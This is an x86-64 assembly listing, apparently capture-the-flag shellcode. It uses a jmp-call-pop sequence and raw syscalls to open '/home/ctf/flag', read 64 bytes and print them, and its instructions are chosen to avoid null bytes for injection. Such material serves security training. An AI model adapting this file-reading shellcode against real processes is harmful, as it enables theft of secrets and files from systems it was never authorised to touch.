section .data

global _start
_start:
  jmp En
St:
  xor rax, rax
  xor rsi, rsi
  xor rdx, rdx
  pop rdi
  mov [rdi + 14], al
  mov al, 2
  syscall
  mov rdi, rax
  mov rsi, rsp
  mov dl, 0x40
  xor rax, rax
  syscall
  xor rdi, rdi
  inc rdi
  mov rsi, rsp
  mov dl, 0x40
  xor rax, rax
  mov al, 1
  syscall
  xor rax, rax
  mov al, 60
  xor rdi, rdi
  syscall
En:
  call St
  db '/home/ctf/flag', 0xa
